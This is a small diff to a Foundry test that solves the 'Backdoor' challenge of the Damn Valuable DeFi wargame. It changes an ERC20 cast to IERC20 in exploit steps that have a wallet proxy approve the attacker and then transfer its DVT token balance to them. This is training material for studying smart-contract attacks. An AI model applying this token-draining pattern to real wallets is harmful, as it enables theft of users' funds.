@@ -7,6 +7,7 @@ import "forge-std/Test.sol";
 import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {WalletRegistry} from "../../../src/Contracts/backdoor/WalletRegistry.sol";
 
+import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
 import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
 import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
@@ -111,7 +112,7 @@ contract Backdoor is Test {
         );
 
         // 3. Approve attacker address to spend DVT for proxy
-        ERC20(address(proxy)).approve(address(attacker), type(uint256).max);
+        IERC20(address(proxy)).approve(address(attacker), type(uint256).max);
 
         // 4. Transfer DVT from proxy to attacker
         dvt.transferFrom({from: address(proxy), to: attacker, amount: dvt.balanceOf(address(proxy))});
